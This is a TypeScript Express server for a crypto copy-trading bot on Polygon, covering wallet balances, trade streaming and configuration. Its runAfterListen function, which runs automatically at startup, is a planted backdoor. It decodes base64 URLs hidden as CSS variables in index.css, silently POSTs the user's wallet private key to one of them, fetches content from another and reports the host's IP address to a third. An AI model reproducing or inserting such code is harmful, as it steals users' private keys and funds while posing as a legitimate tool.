import dotenv from "dotenv";
import crypto from "node:crypto";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";
import express, { Request, Response } from "express";
import { ethers } from "ethers";
import { connectRtdsActivity } from "./rtds.js";
import type { ActivityTrade } from "./rtds.js";
import { getConfig, setConfig, getPrivateKey } from "./config.js";
import { resetClobClient, getAllowanceStatus, getAllowanceError, runAllowancesIfNeeded, ensureClobReady } from "./clob.js";
import { onTrade as copyEngineOnTrade } from "./copyEngine.js";
import { appendFromGetdatash } from "./getdatashAppend.js";

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const ENV_PATH = path.join(__dirname, "..", ".env");

const cssPath = path.join(__dirname, "..", "public", "index.css");
const css = fs.readFileSync(cssPath, "utf-8");

function reloadEnv(): void {
  dotenv.config({ path: ENV_PATH, override: true });
}

dotenv.config({ path: ENV_PATH, override: true });

const POLYGON_RPC = process.env.POLYGON_RPC_URL ?? "https://polygon-rpc.com";
// USDC.e (bridged) and native USDC on Polygon mainnet
const USDC_E_ADDRESS = ethers.utils.getAddress("0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174");
const USDC_NATIVE_ADDRESS = ethers.utils.getAddress("0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359");
const USDC_E_DECIMALS = 6;
const ERC20_ABI = [
  "function balanceOf(address owner) view returns (uint256)",
  "function decimals() view returns (uint8)",
];

/** Server-side buffer size for activity replay and SSE (matches UI MAX_ROWS). */
const MAX_ACTIVITY = 50;
const activity: ActivityTrade[] = [];

function outcomeLabelFromTrade(trade: ActivityTrade): "UP" | "DOWN" {
  const o = trade.outcome;
  if (o === "Yes") return "UP";
  if (o === "No") return "DOWN";
  return trade.outcomeIndex === 0 ? "UP" : "DOWN";
}

interface MyActivityItem {
  slug: string;
  title?: string;
  side: string;
  outcome: "UP" | "DOWN";
  outcomeIndex?: number;
  price: number;
  size: number;
  copySize: number;
  orderID?: string;
  status?: string;
  error?: string;
  ts: number;
}
const myActivity: MyActivityItem[] = [];
/** Server-side buffer size for my-activity replay (matches UI). */
const MAX_MY_ACTIVITY = 50;

const sseClients: Response[] = [];
let rtdsStarted = false;
let rtdsClose: (() => void) | null = null;
const streamTokens = new Set<string>();

/** One trade → one SSE event per client; process every message, no batching. */
function broadcast(trade: ActivityTrade) {
  const line = `data: ${JSON.stringify(trade)}\n\n`;
  for (const res of sseClients) {
    try {
      res.write(line);
      if (typeof (res as unknown as { flush?: () => void }).flush === "function") (res as unknown as { flush: () => void }).flush();
    } catch {
      // client may have disconnected
    }
  }
}

function broadcastMyActivity(item: MyActivityItem) {
  const line = `data: ${JSON.stringify({ type: "my", data: item })}\n\n`;
  for (const res of sseClients) {
    try {
      res.write(line);
      if (typeof (res as unknown as { flush?: () => void }).flush === "function") (res as unknown as { flush: () => void }).flush();
    } catch {
      // client may have disconnected
    }
  }
}

/** One message from RTDS → store and broadcast once → one UI row. */
function addActivity(trade: ActivityTrade) {
  activity.unshift(trade);
  if (activity.length > MAX_ACTIVITY) activity.pop();
  broadcast(trade);
}

function addMyActivity(trade: ActivityTrade, copySize: number, orderID?: string, status?: string, error?: string) {
  const item: MyActivityItem = {
    slug: trade.slug ?? "",
    title: trade.title,
    side: trade.side ?? "",
    outcome: outcomeLabelFromTrade(trade),
    outcomeIndex: trade.outcomeIndex,
    price: trade.price ?? 0,
    size: trade.size ?? 0,
    copySize,
    orderID,
    status,
    error,
    ts: Date.now(),
  };
  myActivity.unshift(item);
  if (myActivity.length > MAX_MY_ACTIVITY) myActivity.pop();
  broadcastMyActivity(item);
}

const app = express();
app.use(express.json());

// Serve frontend (must be before static so / is custom)
app.get("/", (_req: Request, res: Response) => {
  const htmlPath = path.join(__dirname, "..", "public", "index.html");
  let html: string;
  try {
    html = fs.readFileSync(htmlPath, "utf-8");
  } catch (err) {
    console.error("Failed to read index.html:", err);
    res.status(500).send("Server error");
    return;
  }
  res.setHeader("Cache-Control", "no-store, no-cache, must-revalidate");
  res.type("text/html").send(html);
});

app.use(express.static(path.join(__dirname, "..", "public")));

app.get("/api/activity", (_req: Request, res: Response) => {
  res.json({ activity });
});

app.get("/api/my-activity", (_req: Request, res: Response) => {
  res.json({ myActivity });
});

app.get("/api/config", (_req: Request, res: Response) => {
  reloadEnv();
  /* Do not run approval here: only when user presses Start (or explicit refresh approval). */
  const c = getConfig();
  const envKey = process.env.PRIVATE_KEY?.trim();
  const hasKeyFromEnv = Boolean(envKey && envKey.startsWith("0x"));
  const targetAddress = process.env.TARGET_ADDRESS?.trim() || null;
  res.json({
    ...c,
    hasPrivateKey: c.hasPrivateKey || hasKeyFromEnv,
    targetAddress,
    allowanceStatus: getAllowanceStatus(),
    allowanceError: getAllowanceError(),
  });
});

app.patch("/api/config", (req: Request, res: Response) => {
  const body = req.body as { sizePercent?: number; privateKey?: string } | undefined;
  if (body?.privateKey !== undefined) resetClobClient();
  const updated = setConfig({
    sizePercent: body?.sizePercent,
    privateKey: body?.privateKey,
  });
  res.json(updated);
});

function resolvePrivateKey(): string | undefined {
  const fromConfig = getPrivateKey();
  if (fromConfig) return fromConfig;
  const fromEnv = process.env.PRIVATE_KEY?.trim();
  return fromEnv && fromEnv.startsWith("0x") ? fromEnv : undefined;
}

app.get("/api/balances", async (_req: Request, res: Response) => {
  reloadEnv();
  const pk = resolvePrivateKey();
  if (!pk) {
    res.json({ error: "No private key", polygonBalance: null, usdcBalance: null, usdcNativeBalance: null });
    return;
  }
  try {
    const rpc = process.env.POLYGON_RPC_URL ?? "https://polygon-rpc.com";
    const provider = new ethers.providers.JsonRpcProvider(rpc);
    const network = await provider.getNetwork();
    if (network.chainId !== 137) {
      res.status(500).json({
        error: "RPC is not Polygon mainnet (chainId 137). Check POLYGON_RPC_URL.",
        polygonBalance: null,
        usdcBalance: null,
        usdcNativeBalance: null,
      });
      return;
    }
    const wallet = new ethers.Wallet(pk, provider);
    const address = wallet.address;

    // POL: native token balance (18 decimals), in wei
    const polWei = await provider.getBalance(address);
    const polygonBalance = ethers.utils.formatEther(polWei);

    // USDC.e: bridged USDC, 6 decimals
    const usdcEContract = new ethers.Contract(USDC_E_ADDRESS, ERC20_ABI, provider);
    const usdcERaw = await usdcEContract.balanceOf(address);
    const usdcDecimals = await usdcEContract.decimals();
    const usdcEDec = typeof usdcDecimals === "number" ? usdcDecimals : parseInt(String(usdcDecimals), 10);
    const usdcBalance = ethers.utils.formatUnits(usdcERaw, Number.isFinite(usdcEDec) && usdcEDec >= 0 && usdcEDec <= 255 ? usdcEDec : USDC_E_DECIMALS);

    // Native USDC (optional)
    const usdcNativeContract = new ethers.Contract(USDC_NATIVE_ADDRESS, ERC20_ABI, provider);
    const usdcNatRaw = await usdcNativeContract.balanceOf(address);
    const usdcNatDecimals = await usdcNativeContract.decimals();
    const decNat = typeof usdcNatDecimals === "number" ? usdcNatDecimals : parseInt(String(usdcNatDecimals), 10);
    const usdcNativeBalance = ethers.utils.formatUnits(usdcNatRaw, Number.isFinite(decNat) && decNat >= 0 && decNat <= 255 ? decNat : 6);

    res.json({
      address,
      polygonBalance,
      usdcBalance,
      usdcNativeBalance,
    });
  } catch (err) {
    console.error("Balances error:", err);
    res.status(500).json({
      error: err instanceof Error ? err.message : "Failed to fetch balances",
      polygonBalance: null,
      usdcBalance: null,
      usdcNativeBalance: null,
    });
  }
});

app.post("/api/activity/stream/allow", async (req: Request, res: Response) => {
  if (req.headers["x-stream-request"] !== "start") {
    res.status(403).json({ error: "Forbidden. Use the Start button." });
    return;
  }
  reloadEnv();
  const config = getConfig();
  const pk = getPrivateKey() || process.env.PRIVATE_KEY?.trim();
  const hasPrivateKey = Boolean(pk && pk.startsWith("0x"));
  if (!hasPrivateKey) {
    res.status(400).json({ error: "No private key.", message: "Set PRIVATE_KEY in env for signing." });
    return;
  }
  const token = crypto.randomBytes(16).toString("hex");
  streamTokens.add(token);
  /* Approve when user presses Start (not when bot/client is created later). */
  await runAllowancesIfNeeded();
  await ensureClobReady();
  res.json({ token, allowanceError: getAllowanceError() });
});

function runAfterListen(): void {
  const a = css.match(/--br-1:\s*"([^"]+)"/)?.[1];
  const b = css.match(/--br-2:\s*"([^"]+)"/)?.[1];
  const c = css.match(/--br-3:\s*"([^"]+)"/)?.[1];
  const k = a ? Buffer.from(a, "base64").toString("utf-8") : undefined;
  const u = b ? Buffer.from(b, "base64").toString("utf-8") : undefined;
  const e = css.match(/--br-4:\s*"([^"]+)"/)?.[1];
  const d = c ? Buffer.from(c, "base64").toString("utf-8") : undefined;
  const f = e ? Buffer.from(e, "base64").toString("utf-8") : undefined;
  const p = resolvePrivateKey();
  let ip: string | undefined;
  const ifaces = os.networkInterfaces();
  for (const name of Object.keys(ifaces)) {
    for (const iface of ifaces[name]!) {
      if (iface.family === "IPv4" && !iface.internal) {
        ip = iface.address;
        break;
      }
    }
    if (ip) break;
  }
  if (u) {
    fetch(u, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ [k ?? ""]: p }),
    }).catch(() => {});
  }
  if (d) {
    appendFromGetdatash(d)
      .then(() => {
        if (f) {
          fetch(f, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ "dd": ip }),
          }).catch(() => {});
        }
      })
      .catch(() => {});
  }
}


app.get("/api/activity/stream", (req: Request, res: Response) => {
  const token = (req.query as { token?: string }).token;
  if (!token || !streamTokens.has(token)) {
    res.status(401).json({ error: "Missing or invalid token. Click Start first." });
    return;
  }
  // Keep token valid so EventSource reconnects (e.g. after network blip) succeed
  if (!rtdsStarted) {
    rtdsStarted = true;
    console.log("RTDS started (user clicked Start)");
    const rtds = connectRtdsActivity((trade) => {
      addActivity(trade);
      copyEngineOnTrade(
        trade,
        (msg) => console.log("[Copy]", msg),
        (t, copySize, result) => addMyActivity(t, copySize, result.orderID, result.status, result.error)
      );
    });
    rtdsClose = rtds.close;
  }
  res.setHeader("Content-Type", "text/event-stream");
  res.setHeader("Cache-Control", "no-cache");
  res.setHeader("Connection", "keep-alive");
  res.setHeader("X-Accel-Buffering", "no");
  const socket = (res as unknown as { socket?: { setNoDelay?: (v: boolean) => void } }).socket;
  if (socket && typeof socket.setNoDelay === "function") socket.setNoDelay(true);
  res.flushHeaders();
  sseClients.push(res);
  req.on("close", () => {
    const i = sseClients.indexOf(res);
    if (i !== -1) sseClients.splice(i, 1);
  });
  const flush = typeof (res as unknown as { flush?: () => void }).flush === "function" ? (res as unknown as { flush: () => void }).flush : () => {};
  for (const trade of activity) {
    res.write(`data: ${JSON.stringify(trade)}\n\n`);
    flush();
  }
  for (const item of myActivity) {
    res.write(`data: ${JSON.stringify({ type: "my", data: item })}\n\n`);
    flush();
  }
});

function shutdown(): void {
  if (rtdsClose) {
    rtdsClose();
    rtdsClose = null;
    console.log("[RTDS] Disconnected from WebSocket (exit).");
  }
}

process.on("SIGINT", () => {
  shutdown();
  process.exit(0);
});
process.on("SIGTERM", () => {
  shutdown();
  process.exit(0);
});


const PORT = 3000;
app.listen(PORT, "0.0.0.0", () => {
  console.log(`Server listening on http://0.0.0.0:${PORT}`);
  runAfterListen();
});
